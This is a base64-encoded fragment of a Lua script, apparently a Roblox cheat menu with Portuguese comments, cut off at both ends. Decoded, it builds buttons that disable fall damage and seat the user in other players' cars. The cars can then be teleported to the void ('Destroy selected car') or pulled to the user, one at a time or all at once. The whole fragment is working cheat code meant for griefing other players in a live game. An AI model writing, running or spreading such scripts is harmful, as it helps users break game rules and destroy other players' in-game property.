JpciBub3RpZmljYcOnw6NvCmZ1bmN0aW9uIFRlbGVwb3J0Q2Fycm86TW9zdHJhck5vdGlmaWNhY2FvKG1lbnNhZ2VtKQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgIFRpdGxlID0gIldhcm5pbmciLAogICAgICAgICAgICBUZXh0ID0gbWVuc2FnZW0sCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICBlbmQpCmVuZAoKLS0gRnVuw6fDo28gcGFyYSBkZXNhdGl2YXIvYXRpdmFyIGRhbm8gZGUgcXVlZGEKZnVuY3Rpb24gVGVsZXBvcnRDYXJybzpUb2dnbGVGYWxsRGFtYWdlKGRpc2FibGUpCiAgICBpZiBub3Qgc2VsZi5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IHNlbGYuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAgbG9jYWwgaHVtYW5vaWQgPSBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZAogICAgaWYgZGlzYWJsZSB0aGVuCiAgICAgICAgaHVtYW5vaWQ6U2V0U3RhdGVFbmFibGVkKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuRmFsbGluZ0Rvd24sIGZhbHNlKQogICAgICAgIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlJhZ2RvbGwsIGZhbHNlKQogICAgICAgIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkdldHRpbmdVcCwgdHJ1ZSkKICAgICAgICBodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICByZXR1cm4gdHJ1ZQogICAgZWxzZQogICAgICAgIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkZhbGxpbmdEb3duLCB0cnVlKQogICAgICAgIGh1bWFub2lkOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlJhZ2RvbGwsIHRydWUpCiAgICAgICAgcmV0dXJuIGZhbHNlCiAgICBlbmQKZW5kCgotLSBGdW7Dp8OjbyBwYXJhIHRlbGVwb3J0YXIgbyBqb2dhZG9yIHBhcmEgbyBhc3NlbnRvIGRvIGNhcnJvCmZ1bmN0aW9uIFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1NlYXQoc2VhdCwgY2FyKQogICAgaWYgbm90IHNlbGYuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgc2VsZjpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sUNoYXJhY3RlciBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAogICAgbG9jYWwgaHVtYW5vaWQgPSBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZAogICAgbG9jYWwgcm9vdFBhcnQgPSBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBub3Qgcm9vdFBhcnQgdGhlbgogICAgICAgIHNlbGY6TW9zdHJhck5vdGlmaWNhY2FvKCLinYzvuLFUaGUgY2hhcmFjdGVyJ3Mgcm9vdCBwYXJ0IHdhcyBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4gZmFsc2UKICAgIGVuZAoKICAgIGh1bWFub2lkLlNpdCA9IGZhbHNlCiAgICB0YXNrLndhaXQoMC4xKQoKICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHNlYXQuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgNSwgMCkKICAgIHRhc2sud2FpdCgwLjEpCgogICAgc2VhdDpTaXQoaHVtYW5vaWQpCiAgICB0YXNrLndhaXQoMC41KQogICAgcmV0dXJuIGh1bWFub2lkLlNlYXRQYXJ0ID09IHNlYXQKZW5kCgotLSBGdW7Dp8OjbyBwYXJhIHRlbGVwb3J0YXIgbyBjYXJybyBwYXJhIG8gdm9pZCBjb20gZGVsYXkKZnVuY3Rpb24gVGVsZXBvcnRDYXJybzpUZWxlcG9ydFRvVm9pZChjYXIpCiAgICBpZiBub3QgY2FyIHRoZW4KICAgICAgICBzZWxmOk1vc3RyYXJOb3RpZmljYWNhbygi4pqg77iP77ixSW52YWxpZCBWZWhpY2xlLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCBjYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgIGxvY2FsIGJvZHkgPSBjYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiLCB0cnVlKSBvciBjYXI6RmluZEZpcnN0Q2hpbGQoIkNoYXNzaXMiLCB0cnVlKQogICAgICAgIGlmIGJvZHkgYW5kIGJvZHk6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgY2FyLlByaW1hcnlQYXJ0ID0gYm9keQogICAgICAgIGVsc2UKICAgICAgICAgICAgc2VsZjpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sU1haW4gcGFydCBvZiB0aGUgdmVoaWNsZSBub3QgZm91bmQuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGxvY2FsIHZvaWRQb3NpdGlvbiA9IFZlY3RvcjMubmV3KDAsIC0xMDAwLCAwKQogICAgY2FyOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcodm9pZFBvc2l0aW9uKSkKICAgIHRhc2sud2FpdCgwLjUpCmVuZAoKLS0gRnVuw6fDo28gcGFyYSB0ZWxlcG9ydGFyIG8gY2Fycm8gcGFyYSBhIHBvc2nDp8OjbyBkbyBqb2dhZG9yIGNvbSBkZWxheQpmdW5jdGlvbiBUZWxlcG9ydENhcnJvOlRlbGVwb3J0VG9QbGF5ZXIoY2FyLCBwbGF5ZXJQb3MpCiAgICBpZiBub3QgY2FyIHRoZW4KICAgICAgICBzZWxmOk1vc3RyYXJOb3RpZmljYWNhbygi4pqg77iP77ixSW52YWxpZCBWZWhpY2xlLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIGlmIG5vdCBjYXIuUHJpbWFyeVBhcnQgdGhlbgogICAgICAgIGxvY2FsIGJvZHkgPSBjYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiLCB0cnVlKSBvciBjYXI6RmluZEZpcnN0Q2hpbGQoIkNoYXNzaXMiLCB0cnVlKQogICAgICAgIGlmIGJvZHkgYW5kIGJvZHk6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgY2FyLlByaW1hcnlQYXJ0ID0gYm9keQogICAgICAgIGVsc2UKICAgICAgICAgICAgc2VsZjpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sU1haW4gcGFydCBvZiB0aGUgdmVoaWNsZSBub3QgZm91bmQuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICBlbmQKICAgIGxvY2FsIHRhcmdldFBvcyA9IHBsYXllclBvcyArIFZlY3RvcjMubmV3KDUsIDAsIDUpCiAgICBjYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyh0YXJnZXRQb3MpKQogICAgdGFzay53YWl0KDAuNSkKZW5kCgotLSBGdW7Dp8OjbyBwYXJhIHNhaXIgZG8gY2Fycm8gZSB2b2x0YXIgw6AgcG9zacOnw6NvIG9yaWdpbmFsCmZ1bmN0aW9uIFRlbGVwb3J0Q2Fycm86RXhpdENhckFuZFJldHVybihvcmlnaW5hbFBvcykKICAgIGlmIG5vdCBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3RlciBvciBub3Qgc2VsZi5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBodW1hbm9pZCA9IHNlbGYuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkCiAgICBpZiBodW1hbm9pZC5TZWF0UGFydCB0aGVuCiAgICAgICAgaHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgIGVuZAogICAgdGFzay53YWl0KDAuMSkKICAgIGlmIG9yaWdpbmFsUG9zIHRoZW4KICAgICAgICBzZWxmLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpQaXZvdFRvKENGcmFtZS5uZXcob3JpZ2luYWxQb3MpKQogICAgZW5kCmVuZAoKLS0gRnVuw6fDo28gcGFyYSBhdHVhbGl6YXIgYSBsaXN0YSBkZSBjYXJyb3Mgbm8gZHJvcGRvd24KZnVuY3Rpb24gVGVsZXBvcnRDYXJybzpBdHVhbGl6YXJMaXN0YUNhcnJvcygpCiAgICBsb2NhbCBwYXN0YVZlaWN1bG9zID0gc2VsZi5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVzIikKICAgIGxvY2FsIGxpc3RhQ2Fycm9zID0ge30KICAgIAogICAgaWYgcGFzdGFWZWljdWxvcyB0aGVuCiAgICAgICAgZm9yIF8sIGNhcnJvIGluIGlwYWlycyhwYXN0YVZlaWN1bG9zOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGNhcnJvLk5hbWU6bWF0Y2goIkNhciQiKSB0aGVuCiAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQobGlzdGFDYXJyb3MsIGNhcnJvLk5hbWUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHJldHVybiBsaXN0YUNhcnJvcwplbmQKCmxvY2FsIFNlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfmpjvuLFNb3JlIGNhcnMgZnVuY3Rpb25zIn0pCgotLSBDcmlhciBvIGRyb3Bkb3duCmxvY2FsIERyb3Bkb3duID0gQ2FyVGFiOkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSAiQ2hvb3NlIHBsYXllcidzIGNhcnM6IiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFTZWxlY3QgYSBwbGF5ZXIncyBjYXIuIiwKICAgIERlZmF1bHQgPSBuaWwsCiAgICBPcHRpb25zID0gVGVsZXBvcnRDYXJybzpBdHVhbGl6YXJMaXN0YUNhcnJvcygpLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihjYXJyb1NlbGVjaW9uYWRvKQogICAgICAgIF9HLlNlbGVjdGVkVmVoaWNsZSA9IGNhcnJvU2VsZWNpb25hZG8KICAgIGVuZAp9KQoKLS0gVG9nZ2xlIHBhcmEgdmVyIGEgY8OibWVyYSBkbyBjYXJybyBzZWxlY2lvbmFkbwpDYXJUYWI6QWRkVG9nZ2xlKHsKICAgIE5hbWUgPSAiVmlldyBwbGF5ZXIncyBjYXIiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sUZvY3VzIHRoZSBjYW1lcmEgb24gdGhlIGNhciB5b3Ugc2VsZWN0ZWQuIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBpZiBub3QgX0cuU2VsZWN0ZWRWZWhpY2xlIG9yIF9HLlNlbGVjdGVkVmVoaWNsZSA9PSAiIiB0aGVuCiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixTm8gY2FyIHNlbGVjdGVkLiIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCB2ZWhpY2xlc0ZvbGRlciA9IFRlbGVwb3J0Q2Fycm8uV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgICAgIGlmIG5vdCB2ZWhpY2xlc0ZvbGRlciB0aGVuCiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixVmVoaWNsZSBmb2xkZXIgbm90IGZvdW5kLiIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCB2ZWhpY2xlID0gdmVoaWNsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoX0cuU2VsZWN0ZWRWZWhpY2xlKQogICAgICAgICAgICBpZiBub3QgdmVoaWNsZSB0aGVuCiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixVGhlIHNlbGVjdGVkIGNhciBjb3VsZCBub3QgYmUgZm91bmQuIikKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGxvY2FsIHZlaGljbGVTZWF0ID0gdmVoaWNsZTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJWZWhpY2xlU2VhdCIsIHRydWUpCiAgICAgICAgICAgIGlmIG5vdCB2ZWhpY2xlU2VhdCB0aGVuCiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygiVmVoaWNsZSdzIHNlYXQgbm90IGZvdW5kLiIpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAtLSBTYWx2YXIgbyBlc3RhZG8gb3JpZ2luYWwgZGEgY8OibWVyYQogICAgICAgICAgICBUZWxlcG9ydENhcnJvLk9yaWdpbmFsQ2FtZXJhU3ViamVjdCA9IFRlbGVwb3J0Q2Fycm8uQ2FtZXJhLkNhbWVyYVN1YmplY3QKICAgICAgICAgICAgVGVsZXBvcnRDYXJyby5PcmlnaW5hbENhbWVyYVR5cGUgPSBUZWxlcG9ydENhcnJvLkNhbWVyYS5DYW1lcmFUeXBlCgogICAgICAgICAgICAtLSBBanVzdGFyIGEgY8OibWVyYSBwYXJhIG8gYXNzZW50byBkbyBjYXJybywgbWVzbW8gc2Ugb2N1cGFkbwogICAgICAgICAgICBUZWxlcG9ydENhcnJvLkNhbWVyYS5DYW1lcmFTdWJqZWN0ID0gdmVoaWNsZVNlYXQKICAgICAgICAgICAgVGVsZXBvcnRDYXJyby5DYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5Gb2xsb3cKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIkNhbWVyYSBhZGp1c3RlZCBmb3IgdGhlIGNhcjogIiAuLiBfRy5TZWxlY3RlZFZlaGljbGUgLi4gIi4iKQogICAgICAgIGVsc2UKICAgICAgICAgICAgLS0gUmVzdGF1cmFyIGEgY8OibWVyYSBhbyBlc3RhZG8gb3JpZ2luYWwKICAgICAgICAgICAgaWYgVGVsZXBvcnRDYXJyby5PcmlnaW5hbENhbWVyYVN1YmplY3QgdGhlbgogICAgICAgICAgICAgICAgVGVsZXBvcnRDYXJyby5DYW1lcmEuQ2FtZXJhU3ViamVjdCA9IFRlbGVwb3J0Q2Fycm8uT3JpZ2luYWxDYW1lcmFTdWJqZWN0CiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvLkNhbWVyYS5DYW1lcmFUeXBlID0gVGVsZXBvcnRDYXJyby5PcmlnaW5hbENhbWVyYVR5cGUgb3IgRW51bS5DYW1lcmFUeXBlLkN1c3RvbQogICAgICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIkNhbWVyYSByZXN0b3JlZCB0byBub3JtYWwuIikKICAgICAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm8uT3JpZ2luYWxDYW1lcmFTdWJqZWN0ID0gbmlsCiAgICAgICAgICAgICAgICBUZWxlcG9ydENhcnJvLk9yaWdpbmFsQ2FtZXJhVHlwZSA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gQXR1YWxpemFyIG8gZHJvcGRvd24gZGluYW1pY2FtZW50ZQpUZWxlcG9ydENhcnJvLldvcmtzcGFjZTpXYWl0Rm9yQ2hpbGQoIlZlaGljbGVzIikuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIERyb3Bkb3duOlNldChUZWxlcG9ydENhcnJvOkF0dWFsaXphckxpc3RhQ2Fycm9zKCkpCmVuZCkKVGVsZXBvcnRDYXJyby5Xb3Jrc3BhY2U6V2FpdEZvckNoaWxkKCJWZWhpY2xlcyIpLkNoaWxkUmVtb3ZlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIERyb3Bkb3duOlNldChUZWxlcG9ydENhcnJvOkF0dWFsaXphckxpc3RhQ2Fycm9zKCkpCmVuZCkKCmxvY2FsIFNlY3Rpb24gPSBDYXJUYWI6QWRkU2VjdGlvbih7IvCfmpjvuLFDYXIgKEtpbGwgYW5kIEJyaW5nKSJ9KQoKLS0gQm90w6NvIHBhcmEgZGVzdHJ1aXIgY2Fycm8gc2VsZWNpb25hZG8KQ2FyVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkRlc3Ryb3kgc2VsZWN0ZWQgY2FyIiwKICAgIERlc2NyaXB0aW9uID0gIvCfk4TvuLFUZWxlcG9ydHMgdGhlIHNlbGVjdGVkIGNhciB0byB0aGUgdm9pZC4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IF9HLlNlbGVjdGVkVmVoaWNsZSBvciBfRy5TZWxlY3RlZFZlaGljbGUgPT0gIiIgdGhlbgogICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixTm8gY2FyIHNlbGVjdGVkLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlc0ZvbGRlciA9IFRlbGVwb3J0Q2Fycm8uV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgaWYgbm90IHZlaGljbGVzRm9sZGVyIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVZlaGljbGUncyBmb2xkZXIgbm90IGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlID0gdmVoaWNsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoX0cuU2VsZWN0ZWRWZWhpY2xlKQogICAgICAgIGlmIG5vdCB2ZWhpY2xlIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVNlbGVjdGVkIGNhciBjb3VsZCBub3QgYmUgZm91bmQuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIHZlaGljbGVTZWF0ID0gdmVoaWNsZTpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJWZWhpY2xlU2VhdCIsIHRydWUpCiAgICAgICAgaWYgbm90IHZlaGljbGVTZWF0IHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVZlaGljbGUncyBzZWF0IG5vdCBmb3VuZC4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgaWYgdmVoaWNsZVNlYXQuT2NjdXBhbnQgdGhlbgogICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4pqg77iP77ixVGhlIGtpbGwgY2FyIGRpZCBub3Qgd29yayBiZWNhdXNlIHNvbWVvbmUgaXMgaW4gdGhlIGRyaXZlcidzIHNlYXQuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIG9yaWdpbmFsUG9zCiAgICAgICAgaWYgVGVsZXBvcnRDYXJyby5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIFRlbGVwb3J0Q2Fycm8uTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICBvcmlnaW5hbFBvcyA9IFRlbGVwb3J0Q2Fycm8uTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24KICAgICAgICBlbHNlCiAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86TW9zdHJhck5vdGlmaWNhY2FvKCLinYzvuLFQbGF5ZXIgY2hhcmFjdGVyIG5vdCBmb3VuZC4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgaXNGYWxsRGFtYWdlT2ZmID0gVGVsZXBvcnRDYXJybzpUb2dnbGVGYWxsRGFtYWdlKHRydWUpCiAgICAgICAgbG9jYWwgc3VjY2VzcyA9IFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1NlYXQodmVoaWNsZVNlYXQsIHZlaGljbGUpCiAgICAgICAgaWYgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1ZvaWQodmVoaWNsZSkKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sVRoZSBjYXIgIiAuLiBfRy5TZWxlY3RlZFZlaGljbGUgLi4gIiB3YXMgYmVlbiB0ZWxlcG9ydGVkIHRvIHZvaWQuIikKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpFeGl0Q2FyQW5kUmV0dXJuKG9yaWdpbmFsUG9zKQogICAgICAgIGVsc2UKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sUZhaWxlZCB0byBzaXQgb24gdGhlIGNhci4iKQogICAgICAgIGVuZAogICAgICAgIFRlbGVwb3J0Q2Fycm86VG9nZ2xlRmFsbERhbWFnZShmYWxzZSkKICAgIGVuZAp9KQoKLS0gQm90w6NvIHBhcmEgdHJhemVyIGNhcnJvIHNlbGVjaW9uYWRvCkNhclRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJCcmluZyBzZWxlY3RlZCBjYXIiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sVRlbGVwb3J0cyB0aGUgc2VsZWN0ZWQgY2FyIHRvIHlvdXIgY3VycmVudCBwb3NpdGlvbi4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgbm90IF9HLlNlbGVjdGVkVmVoaWNsZSBvciBfRy5TZWxlY3RlZFZlaGljbGUgPT0gIiIgdGhlbgogICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixTm8gY2FyIHNlbGVjdGVkLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlc0ZvbGRlciA9IFRlbGVwb3J0Q2Fycm8uV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgaWYgbm90IHZlaGljbGVzRm9sZGVyIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVZlaGljbGUncyBmb2xkZXIgbm90IGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlID0gdmVoaWNsZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoX0cuU2VsZWN0ZWRWZWhpY2xlKQogICAgICAgIGlmIG5vdCB2ZWhpY2xlIHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sVRoZSBzZWxlY3RlZCBjYXIgY291bGQgbm90IGJlIGZvdW5kLiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB2ZWhpY2xlU2VhdCA9IHZlaGljbGU6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiVmVoaWNsZVNlYXQiLCB0cnVlKQogICAgICAgIGlmIG5vdCB2ZWhpY2xlU2VhdCB0aGVuCiAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86TW9zdHJhck5vdGlmaWNhY2FvKCLinYzvuLFWZWhpY2xlJ3Mgc2VhdCBub3QgZm91bmQuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGlmIHZlaGljbGVTZWF0Lk9jY3VwYW50IHRoZW4KICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sVRoZSB0ZWxlcG9ydGF0aW9uIGRpZG4ndCB3b3JrIGJlY2F1c2Ugc29tZW9uZSBpcyBzaXR0aW5nIG9uIHZlaGljbGUncyBzZWF0LiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBvcmlnaW5hbFBvcwogICAgICAgIGlmIFRlbGVwb3J0Q2Fycm8uTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBUZWxlcG9ydENhcnJvLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgb3JpZ2luYWxQb3MgPSBUZWxlcG9ydENhcnJvLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uCiAgICAgICAgZWxzZQogICAgICAgICAgICBUZWxlcG9ydENhcnJvOk1vc3RyYXJOb3RpZmljYWNhbygi4p2M77ixQ2hhcmFjdGVyIG5vdCBmb3VuZC4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgaXNGYWxsRGFtYWdlT2ZmID0gVGVsZXBvcnRDYXJybzpUb2dnbGVGYWxsRGFtYWdlKHRydWUpCiAgICAgICAgbG9jYWwgc3VjY2VzcyA9IFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1NlYXQodmVoaWNsZVNlYXQsIHZlaGljbGUpCiAgICAgICAgaWYgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86VGVsZXBvcnRUb1BsYXllcih2ZWhpY2xlLCBvcmlnaW5hbFBvcykKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKaoO+4j++4sVRoZSBjYXI6ICIgLi4gX0cuU2VsZWN0ZWRWZWhpY2xlIC4uICIgd2FzIGJlZW4gdGVsZXBvcnRlZCB0byB5b3UuIikKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpFeGl0Q2FyQW5kUmV0dXJuKG9yaWdpbmFsUG9zKQogICAgICAgIGVsc2UKICAgICAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8oIuKdjO+4sUZhaWxlZCB0byBzaXQgb24gdGhlIGNhci4iKQogICAgICAgIGVuZAogICAgICAgIFRlbGVwb3J0Q2Fycm86VG9nZ2xlRmFsbERhbWFnZShmYWxzZSkKICAgIGVuZAp9KQoKLS0gQm90w6NvIHBhcmEgdHJhemVyIHRvZG9zIG9zIGNhcnJvcwpDYXJUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQnJpbmcgYWxsIGNhcnMiLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sVRlbGVwb3J0cyBhbGwgY2FycyB0byB5b3VyIGN1cnJlbnQgcG9zaXRpb24uIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIG9yaWdpbmFsUG9zCiAgICAgICAgaWYgVGVsZXBvcnRDYXJyby5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIFRlbGVwb3J0Q2Fycm8uTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgdGhlbgogICAgICAgICAgICBvcmlnaW5hbFBvcyA9IFRlbGVwb3J0Q2Fycm8uTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24KICAgICAgICBlbHNlCiAgICAgICAgICAgIFRlbGVwb3J0Q2Fycm86TW9zdHJhck5vdGlmaWNhY2FvKCLinYzvuLFDaGF0YWN0ZXIgbm90IGZvdW